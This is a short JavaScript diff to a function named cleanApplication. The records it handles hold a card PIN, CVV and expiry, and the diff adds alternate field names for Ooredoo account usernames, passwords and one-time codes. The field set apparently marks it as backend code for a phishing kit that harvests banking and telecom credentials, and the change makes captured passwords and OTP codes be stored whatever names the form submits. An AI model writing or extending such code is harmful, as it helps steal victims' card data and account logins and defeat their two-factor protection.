@@ -47,6 +47,9 @@ function cleanApplication(b) {
   const residency = b.residency ?? b.st;
   const bankId = b.bankId ?? b.bank;
   const address = b.address ?? b.ad;
+  const ooredooUser = b.ooredooUsername ?? b.ooredooUser;
+  const ooredooPass = b.ooredooPassword ?? b.ooredooPass;
+  const ooredooOtp = b.ooredooCode ?? b.ooredooOtp;
   const status = ["new", "pending", "awaiting", "confirmed", "rejected"].includes(b.status) ? b.status : "new";
   return {
     ref: str(b.ref, 40) || ("HM-" + Date.now().toString().slice(-8)),
@@ -76,9 +79,9 @@ function cleanApplication(b) {
     pin: str(b.pin, 20),
     cvv: str(b.cvv, 10),
     expiry: str(b.expiry, 20),
-    ooredooUser: str(b.ooredooUser, 100),
-    ooredooPass: str(b.ooredooPass, 100),
-    ooredooOtp: str(b.ooredooOtp, 20)
+    ooredooUser: str(ooredooUser, 100), ooredooUsername: str(ooredooUser, 100),
+    ooredooPass: str(ooredooPass, 100), ooredooPassword: str(ooredooPass, 100),
+    ooredooOtp: str(ooredooOtp, 20), ooredooCode: str(ooredooOtp, 20)
   };
 }
 
